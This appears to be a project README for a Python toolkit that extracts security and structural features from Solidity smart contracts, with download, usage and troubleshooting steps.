## 📚 Introduction

Welcome to Python-Solidity-Feature-Engineering! This toolkit helps you analyze Solidity smart contracts easily. It reads and breaks down the code, helping you to find important signals about security and performance. Whether you're curious about audits or just interested in smart contracts, this tool will provide useful insights without needing to write a single line of code.

## 🚀 Getting Started

Before you begin, make sure you have the required software to run this application.

### 🖥️ System Requirements

- Windows, macOS, or Linux operating system.
- Python 3.6 or later must be installed on your computer.
- Basic understanding of how to download and run software from a web browser.

## 📥 Download & Install

To get started, visit this page to download: [Python-Solidity-Feature-Engineering Releases](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/releases).

1. Go to the releases page by clicking the link above.
2. Look for the latest version.
3. Download the installation package suitable for your system.
4. Open the downloaded file and follow the installation instructions on the screen.

## ⚙️ Usage Instructions

After installation, you can start using the toolkit to analyze Solidity contracts.

### 1. Open Your Command Line Interface

- **Windows**: Search for "cmd" in your start menu.
- **macOS**: Open "Terminal" from your applications.
- **Linux**: Open your preferred terminal application.

### 2. Running the Application 

Type the following command to start the tool:

```bash
python python_solidity_feature_engineering.py
```

### 3. Input Your Solidity Contract

Once the application opens, you will see a prompt asking for the path to your Solidity contract file. Enter the full path to your `.sol` file.

### 4. View the Analysis Results

After inputting your file, the application will analyze it. The results will show important features and any security risks it finds.

## 🧩 Features of the Toolkit

- **Easy Analysis**: Quickly understand the structure and security of your smart contracts.
- **Feature Extraction**: Gain insights into risky patterns and other important features of Solidity code.
- **Data-Driven Insights**: Use extracted signals for better decision-making in contracts.

## 🛡️ Security Awareness

This tool focuses on identifying vulnerabilities in Solidity code. You should always review and understand the results for any significant decisions. The insights provided can guide your decision-making but should not replace thorough audits by professionals.

## 🔄 Troubleshooting

If you encounter issues while running Python-Solidity-Feature-Engineering, consider the following:

- Make sure Python is correctly installed and added to your PATH.
- Check that your Solidity contract has no syntax errors.
- Ensure you have the appropriate permissions to read the file.
